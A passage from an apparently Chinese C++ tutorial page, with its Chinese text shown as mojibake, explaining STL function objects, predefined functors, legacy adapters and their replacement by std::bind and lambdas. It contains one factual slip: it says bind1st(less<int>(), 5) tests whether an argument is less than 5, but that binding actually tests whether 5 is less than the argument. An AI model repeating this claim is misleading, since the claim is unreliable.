class="keyword">auto</span>&amp; entry : phonebook) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; entry.first &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; entry.second &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bob&#x27;s number: &quot;</span> &lt;&lt; phonebook[<span class="string">&quot;Bob&quot;</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (phonebook.count(<span class="string">&quot;David&quot;</span>)) &#123; <span class="comment">// count() è¿”å› 0 æˆ– 1</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;David found.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;David not found.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ— åºå®¹å™¨åœ¨ä¸éœ€è¦å…ƒç´ æ’åºä¸”æ³¨é‡å¹³å‡æŸ¥æ‰¾æ€§èƒ½çš„åœºæ™¯ä¸‹éå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚å®ç°ç¼“å­˜ã€å¿«é€ŸæŸ¥æ‰¾è¡¨ç­‰ã€‚</p><h2 id="16-5-å‡½æ•°å¯¹è±¡"><a href="#16-5-å‡½æ•°å¯¹è±¡" class="headerlink" title="16.5 å‡½æ•°å¯¹è±¡"></a>16.5 å‡½æ•°å¯¹è±¡</h2><p>åœ¨ STL ä¸­ï¼Œè®¸å¤šç®—æ³•ï¼ˆå¦‚ <code>sort</code>, <code>find_if</code>, <code>for_each</code>ï¼‰ä¸ä»…å¯ä»¥é€šè¿‡è¿­ä»£å™¨æŒ‡å®šæ“ä½œçš„èŒƒå›´ï¼Œè¿˜å¯ä»¥æ¥å—ä¸€ä¸ªé¢å¤–çš„å‚æ•°æ¥<strong>å®šåˆ¶å…¶è¡Œä¸º</strong>ã€‚è¿™ä¸ªå‚æ•°é€šå¸¸æ˜¯ä¸€ä¸ª<strong>å¯è°ƒç”¨ (Callable)</strong> çš„å®ä½“ï¼Œç”¨äºæŒ‡å®šæ¯”è¾ƒè§„åˆ™ã€åˆ¤æ–­æ¡ä»¶æˆ–è¦æ‰§è¡Œçš„æ“ä½œã€‚</p><p>é™¤äº†æ™®é€šçš„å‡½æ•°æŒ‡é’ˆï¼ŒC++ è¿˜æä¾›äº†ä¸€ç§å¼ºå¤§çš„å¯è°ƒç”¨å®ä½“ï¼š**å‡½æ•°å¯¹è±¡ (Function Object)**ï¼Œä¹Ÿç§°ä¸º **å‡½æ•°ç¬¦ (Functor)**ã€‚</p><h3 id="16-5-1-å‡½æ•°ç¬¦æ¦‚å¿µ"><a href="#16-5-1-å‡½æ•°ç¬¦æ¦‚å¿µ" class="headerlink" title="16.5.1 å‡½æ•°ç¬¦æ¦‚å¿µ"></a>16.5.1 å‡½æ•°ç¬¦æ¦‚å¿µ</h3><p>å‡½æ•°å¯¹è±¡ï¼ˆæˆ–å‡½æ•°ç¬¦ï¼‰æ˜¯ä¸€ä¸ª<strong>é‡è½½äº†å‡½æ•°è°ƒç”¨è¿ç®—ç¬¦ <code>operator()</code></strong> çš„ç±»çš„å¯¹è±¡ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥åƒè°ƒç”¨å‡½æ•°ä¸€æ ·ä½¿ç”¨è¿™ä¸ªå¯¹è±¡ã€‚</p><p><strong>åŸºæœ¬ç»“æ„:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ªå‡½æ•°å¯¹è±¡ç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFunctor</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// é‡è½½ operator()</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span> x)</span> <span class="keyword">const</span> </span>&#123; <span class="comment">// å¯ä»¥æ˜¯ const æˆå‘˜å‡½æ•°</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Functor called with value: &quot;</span> &lt;&lt; x &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MyFunctor f; <span class="comment">// åˆ›å»ºå‡½æ•°å¯¹è±¡</span></span><br><span class="line">    f(<span class="number">10</span>);       <span class="comment">// è°ƒç”¨å¯¹è±¡ï¼Œå°±åƒè°ƒç”¨å‡½æ•°ä¸€æ ·</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¹Ÿå¯ä»¥ä¸´æ—¶åˆ›å»ºå¹¶è°ƒç”¨</span></span><br><span class="line">    MyFunctor()(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä¸ºä»€ä¹ˆä½¿ç”¨å‡½æ•°å¯¹è±¡ï¼Ÿ</strong></p><ol><li><p><strong>æºå¸¦çŠ¶æ€:</strong> ä¸æ™®é€šå‡½æ•°ä¸åŒï¼Œå‡½æ•°å¯¹è±¡æ˜¯<strong>å¯¹è±¡</strong>ï¼Œå®ƒå¯ä»¥æ‹¥æœ‰è‡ªå·±çš„<strong>æˆå‘˜å˜é‡ï¼ˆçŠ¶æ€ï¼‰</strong>ã€‚è¿™äº›çŠ¶æ€å¯ä»¥åœ¨å¤šæ¬¡è°ƒç”¨ä¹‹é—´ä¿æŒï¼Œæˆ–è€…åœ¨åˆ›å»ºæ—¶è¿›è¡Œé…ç½®ã€‚è¿™å¯¹äºéœ€è¦ç´¯åŠ ã€è®¡æ•°æˆ–æ ¹æ®ç‰¹å®šä¸Šä¸‹æ–‡æ“ä½œçš„ç®—æ³•éå¸¸æœ‰ç”¨ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt; // for for_each</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å¯¹è±¡ï¼Œç”¨äºè®¡ç®—æ€»å’Œå¹¶è®°å½•è°ƒç”¨æ¬¡æ•°</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SumAndCount</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    SumAndCount() : sum(<span class="number">0</span>), count(<span class="number">0</span>) &#123;&#125; <span class="comment">// åˆå§‹åŒ–çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        sum += x;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getSum</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> sum; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getCount</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> count; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    SumAndCount sac; <span class="comment">// åˆ›å»ºå¸¦æœ‰çŠ¶æ€çš„å‡½æ•°å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†å‡½æ•°å¯¹è±¡ä¼ é€’ç»™ for_each ç®—æ³•</span></span><br><span class="line">    <span class="comment">// for_each ä¼šå¯¹ nums ä¸­çš„æ¯ä¸ªå…ƒç´ è°ƒç”¨ sac.operator()</span></span><br><span class="line">    <span class="comment">// æ³¨æ„ï¼šfor_each è¿”å›å…¶å‡½æ•°å¯¹è±¡å‚æ•°çš„å‰¯æœ¬ã€‚</span></span><br><span class="line">    <span class="comment">// å¦‚æœéœ€è¦è·å–æœ€ç»ˆçŠ¶æ€ï¼Œéœ€è¦æ¥æ”¶è¿”å›å€¼ï¼ˆæˆ–ä½¿ç”¨å¼•ç”¨åŒ…è£…å™¨ï¼‰</span></span><br><span class="line">    sac = <span class="built_in">std</span>::for_each(nums.begin(), nums.end(), sac);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum: &quot;</span> &lt;&lt; sac.getSum() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// è¾“å‡º 15</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count: &quot;</span> &lt;&lt; sac.getCount() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> <strong>å†…è”å¯èƒ½æ€§:</strong> ç¼–è¯‘å™¨é€šå¸¸æ›´å®¹æ˜“å¯¹å‡½æ•°å¯¹è±¡çš„ <code>operator()</code> è¿›è¡Œ<strong>å†…è” (inline)</strong> ä¼˜åŒ–ï¼Œå› ä¸ºå®ƒåœ¨ç¼–è¯‘æ—¶æ˜¯å·²çŸ¥çš„ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œé€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°é€šå¸¸ä¼šé˜»æ­¢å†…è”ï¼Œå¯èƒ½å¸¦æ¥è½»å¾®çš„æ€§èƒ½å¼€é”€ã€‚</p></li><li><p> <strong>ç±»å‹å¤šæ ·æ€§:</strong> æ¯ä¸ªå‡½æ•°å¯¹è±¡ç±»éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ç±»å‹ã€‚è¿™å…è®¸æˆ‘ä»¬é€šè¿‡æ¨¡æ¿ç‰¹åŒ–æˆ–é‡è½½æ¥ä¸ºä¸åŒçš„å‡½æ•°å¯¹è±¡æä¾›ä¸åŒçš„è¡Œä¸ºã€‚</p></li></ol><h3 id="16-5-2-é¢„å®šä¹‰çš„å‡½æ•°ç¬¦"><a href="#16-5-2-é¢„å®šä¹‰çš„å‡½æ•°ç¬¦" class="headerlink" title="16.5.2 é¢„å®šä¹‰çš„å‡½æ•°ç¬¦"></a>16.5.2 é¢„å®šä¹‰çš„å‡½æ•°ç¬¦</h3><p>æ ‡å‡†åº“åœ¨ <code>&lt;functional&gt;</code> å¤´æ–‡ä»¶ä¸­æä¾›äº†ä¸€ç³»åˆ—å¸¸ç”¨çš„<strong>é¢„å®šä¹‰å‡½æ•°ç¬¦</strong>ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œçœå»äº†è‡ªå·±ç¼–å†™ç®€å•æ“ä½œç±»çš„éº»çƒ¦ã€‚</p><p>å¸¸è§çš„é¢„å®šä¹‰å‡½æ•°ç¬¦åŒ…æ‹¬ï¼š</p><ul><li><strong>ç®—æœ¯ç±»:</strong><ul><li>  <code>plus&lt;T&gt;</code>: æ‰§è¡Œ <code>arg1 + arg2</code>ã€‚</li><li>  <code>minus&lt;T&gt;</code>: æ‰§è¡Œ <code>arg1 - arg2</code>ã€‚</li><li>  <code>multiplies&lt;T&gt;</code>: æ‰§è¡Œ <code>arg1 * arg2</code>ã€‚</li><li>  <code>divides&lt;T&gt;</code>: æ‰§è¡Œ <code>arg1 / arg2</code>ã€‚</li><li>  <code>modulus&lt;T&gt;</code>: æ‰§è¡Œ <code>arg1 % arg2</code>ã€‚</li><li>  <code>negate&lt;T&gt;</code>: æ‰§è¡Œ <code>-arg</code>ã€‚</li></ul></li><li><strong>æ¯”è¾ƒç±»:</strong><ul><li>  <code>equal_to&lt;T&gt;</code>: æ‰§è¡Œ <code>arg1 == arg2</code>ã€‚</li><li>  <code>not_equal_to&lt;T&gt;</code>: æ‰§è¡Œ <code>arg1 != arg2</code>ã€‚</li><li>  <code>less&lt;T&gt;</code>: æ‰§è¡Œ <code>arg1 &lt; arg2</code> (é»˜è®¤æ’åºè§„åˆ™)ã€‚</li><li>  <code>greater&lt;T&gt;</code>: æ‰§è¡Œ <code>arg1 &gt; arg2</code>ã€‚</li><li>  <code>less_equal&lt;T&gt;</code>: æ‰§è¡Œ <code>arg1 &lt;= arg2</code>ã€‚</li><li>  <code>greater_equal&lt;T&gt;</code>: æ‰§è¡Œ <code>arg1 &gt;= arg2</code>ã€‚</li></ul></li><li><strong>é€»è¾‘ç±»:</strong><ul><li>  <code>logical_and&lt;T&gt;</code>: æ‰§è¡Œ <code>arg1 &amp;&amp; arg2</code>ã€‚</li><li>  <code>logical_or&lt;T&gt;</code>: æ‰§è¡Œ <code>arg1 || arg2</code>ã€‚</li><li>  <code>logical_not&lt;T&gt;</code>: æ‰§è¡Œ <code>!arg</code>ã€‚</li></ul></li></ul><p><strong>ä½¿ç”¨ç¤ºä¾‹:</strong></p><p>è¿™äº›é¢„å®šä¹‰å‡½æ•°ç¬¦å¸¸ç”¨äºéœ€è¦è‡ªå®šä¹‰æ¯”è¾ƒæˆ–æ“ä½œçš„ STL ç®—æ³•ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt; // for sort, count_if</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;functional&gt; // åŒ…å«é¢„å®šä¹‰å‡½æ•°ç¬¦</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums = &#123;<span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ greater&lt;int&gt; è¿›è¡Œé™åºæ’åº</span></span><br><span class="line">    <span class="built_in">std</span>::sort(nums.begin(), nums.end(), <span class="built_in">std</span>::greater&lt;<span class="keyword">int</span>&gt;());</span><br><span class="line">    <span class="comment">// ç­‰ä»·äº std::sort(nums.begin(), nums.end(), [](int a, int b)&#123; return a &gt; b; &#125;);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sorted descending: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> n : nums) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; n &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// è¾“å‡º: 9 8 5 4 2 1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ less&lt;int&gt; å’Œ bind (æˆ– lambda) æ¥æŸ¥æ‰¾å°äº 5 çš„å…ƒç´ æ•°é‡</span></span><br><span class="line">    <span class="comment">// C++11 ä¹‹å‰çš„åšæ³•å¯èƒ½ä½¿ç”¨ bind1st/bind2nd (å·²åºŸå¼ƒ) æˆ– boost::bind</span></span><br><span class="line">    <span class="comment">// C++11 åŠä»¥åï¼Œlambda æ›´å¸¸ç”¨ï¼š</span></span><br><span class="line">    <span class="keyword">int</span> count_less_than_5 = <span class="built_in">std</span>::count_if(nums.begin(), nums.end(),</span><br><span class="line">                                          [](<span class="keyword">int</span> x)&#123; <span class="keyword">return</span> x &lt; <span class="number">5</span>; &#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count less than 5: &quot;</span> &lt;&lt; count_less_than_5 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3 (4, 2, 1)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨é¢„å®šä¹‰å‡½æ•°ç¬¦å’Œ lambda ç»“åˆ (è™½ç„¶æœ‰ç‚¹ç»•)</span></span><br><span class="line">    <span class="keyword">int</span> threshold = <span class="number">5</span>;</span><br><span class="line">    count_less_than_5 = <span class="built_in">std</span>::count_if(nums.begin(), nums.end(),</span><br><span class="line">                                     [threshold](<span class="keyword">int</span> x)&#123; <span class="keyword">return</span> <span class="built_in">std</span>::less&lt;<span class="keyword">int</span>&gt;()(x, threshold); &#125;);</span><br><span class="line">     <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count less than 5 (lambda+functor): &quot;</span> &lt;&lt; count_less_than_5 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-5-3-è‡ªé€‚åº”å‡½æ•°ç¬¦å’Œå‡½æ•°é€‚é…å™¨-æ—§æ¦‚å¿µ"><a href="#16-5-3-è‡ªé€‚åº”å‡½æ•°ç¬¦å’Œå‡½æ•°é€‚é…å™¨-æ—§æ¦‚å¿µ" class="headerlink" title="16.5.3 è‡ªé€‚åº”å‡½æ•°ç¬¦å’Œå‡½æ•°é€‚é…å™¨ (æ—§æ¦‚å¿µ)"></a>16.5.3 è‡ªé€‚åº”å‡½æ•°ç¬¦å’Œå‡½æ•°é€‚é…å™¨ (æ—§æ¦‚å¿µ)</h3><p>åœ¨ C++11 å¼•å…¥ lambda è¡¨è¾¾å¼ä¹‹å‰ï¼Œä¸ºäº†æ›´çµæ´»åœ°ç»„åˆå’Œä½¿ç”¨å‡½æ•°ç¬¦ï¼ŒSTL æä¾›äº†ä¸€äº›æ›´å¤æ‚çš„æœºåˆ¶ï¼Œå¦‚<strong>è‡ªé€‚åº”å‡½æ•°ç¬¦ (Adaptable Functors)</strong> å’Œ**å‡½æ•°é€‚é…å™¨ (Function Adapters)**ã€‚</p><ul><li>  <strong>è‡ªé€‚åº”å‡½æ•°ç¬¦:</strong> é™¤äº† <code>operator()</code>ï¼Œè¿˜æä¾›äº†ä¸€äº›åµŒå¥—çš„ <code>typedef</code>ï¼ˆå¦‚ <code>result_type</code>, <code>first_argument_type</code>, <code>second_argument_type</code>ï¼‰ï¼Œä½¿å¾—é€‚é…å™¨èƒ½å¤Ÿäº†è§£å‡½æ•°ç¬¦çš„å‚æ•°å’Œè¿”å›ç±»å‹ã€‚é¢„å®šä¹‰çš„å‡½æ•°ç¬¦å¤§å¤šæ˜¯è‡ªé€‚åº”çš„ã€‚</li><li><strong>å‡½æ•°é€‚é…å™¨:</strong> ç”¨äºä¿®æ”¹æˆ–ç»‘å®šå‡½æ•°ç¬¦çš„å‚æ•°ã€‚<ul><li>  <strong>ç»‘å®šå™¨ (Binders):</strong> å¦‚ <code>bind1st</code> å’Œ <code>bind2nd</code> (åœ¨ C++11 ä¸­<strong>åºŸå¼ƒ</strong>ï¼ŒC++17 ä¸­<strong>ç§»é™¤</strong>)ï¼Œç”¨äºå°†äºŒå…ƒå‡½æ•°ç¬¦çš„ä¸€ä¸ªå‚æ•°ç»‘å®šåˆ°ç‰¹å®šå€¼ï¼Œç”Ÿæˆä¸€ä¸ªä¸€å…ƒå‡½æ•°ç¬¦ã€‚ä¾‹å¦‚ï¼Œ<code>bind1st(less&lt;int&gt;(), 5)</code> ä¼šåˆ›å»ºä¸€ä¸ªåˆ¤æ–­å‚æ•°æ˜¯å¦å°äº 5 çš„ä¸€å…ƒå‡½æ•°ç¬¦ã€‚</li><li>  <strong>æ±‚åå™¨ (Negators):</strong> å¦‚ <code>not1</code> å’Œ <code>not2</code> (åœ¨ C++17 ä¸­<strong>åºŸå¼ƒ</strong>)ï¼Œç”¨äºå¯¹ä¸€å…ƒæˆ–äºŒå…ƒè°“è¯å‡½æ•°ç¬¦çš„ç»“æœå–åã€‚ä¾‹å¦‚ï¼Œ<code>not1(is_even)</code> ä¼šåˆ›å»ºä¸€ä¸ªåˆ¤æ–­æ˜¯å¦ä¸ºå¥‡æ•°çš„ä¸€å…ƒå‡½æ•°ç¬¦ã€‚</li><li>  <strong>æˆå‘˜å‡½æ•°é€‚é…å™¨:</strong> å¦‚ <code>mem_fun</code> å’Œ <code>mem_fun_ref</code> (åœ¨ C++11 ä¸­<strong>åºŸå¼ƒ</strong>ï¼ŒC++17 ä¸­<strong>ç§»é™¤</strong>)ï¼Œç”¨äºå°†æˆå‘˜å‡½æ•°åŒ…è£…æˆå¯ä»¥è¢« STL ç®—æ³•ä½¿ç”¨çš„å‡½æ•°å¯¹è±¡ã€‚</li></ul></li></ul><p><strong>ç°ä»£ C++ çš„æ›¿ä»£æ–¹æ¡ˆ:</strong></p><p>è¿™äº›æ—§çš„é€‚é…å™¨æœºåˆ¶æ¯”è¾ƒå¤æ‚ä¸”ç”¨æ³•å—é™ã€‚åœ¨ç°ä»£ C++ (C++11 åŠä»¥å) ä¸­ï¼Œå®ƒä»¬çš„åŠŸèƒ½å¾ˆå¤§ç¨‹åº¦ä¸Šè¢«ä»¥ä¸‹ç‰¹æ€§å–ä»£ï¼š</p><ul><li>  <strong><code>std::bind</code> (æ¥è‡ª <code>&lt;functional&gt;</code>):</strong> ä¸€ä¸ªæ›´é€šç”¨ã€æ›´å¼ºå¤§çš„ç»‘å®šå™¨ï¼Œå¯ä»¥ç»‘å®šæ™®é€šå‡½æ•°ã€æˆå‘˜å‡½æ•°ã€å‡½æ•°å¯¹è±¡ï¼Œå¹¶çµæ´»åœ°æŒ‡å®šå‚æ•°å ä½ç¬¦ (<code>std::placeholders::_1</code>, <code>_2</code> ç­‰)ã€‚</li><li>  <strong>Lambda è¡¨è¾¾å¼:</strong> æä¾›äº†éå¸¸ç®€æ´å’Œçµæ´»çš„æ–¹å¼æ¥å°±åœ°å®šä¹‰åŒ¿åå‡½æ•°å¯¹è±¡ï¼Œå¯ä»¥æ•è·ä¸Šä¸‹æ–‡å˜é‡ï¼Œæå¤§åœ°ç®€åŒ–äº†éœ€è¦ä¼ é€’è‡ªå®šä¹‰é€»è¾‘ç»™ç®—æ³•çš„åœºæ™¯ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;functional&gt; // for std::bind, std::less, std::placeholders</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums = &#123;<span class="number">9</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> threshold = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ std::bind (æ›¿ä»£ bind1st/bind2nd)</span></span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªä¸€å…ƒè°“è¯ï¼Œåˆ¤æ–­ x &lt; threshold</span></span><br><span class="line">    <span class="keyword">auto</span> less_than_threshold = <span class="built_in">std</span>::bind(<span class="built_in">std</span>::less&lt;<span class="keyword">int</span>&gt;(), <span class="built_in">std</span>::placeholders::_1, threshold);</span><br><span class="line">    <span class="keyword">int</span> count1 = <span class="built_in">std</span>::count_if(nums.begin(), nums.end(), less_than_threshold);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count (bind): &quot;</span> &lt;&lt; count1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ Lambda è¡¨è¾¾å¼ (æ›´ç®€æ´)</span></span><br><span class="line">    <span class="keyword">int</span> count2 = <span class="built_in">std</span>::count_if(nums.begin(), nums.end(),</span><br><span class="line">                              [threshold](<span class="keyword">int</span> x)&#123; <span class="keyword">return</span> x &lt; threshold; &#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count (lambda): &quot;</span> &lt;&lt; count2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 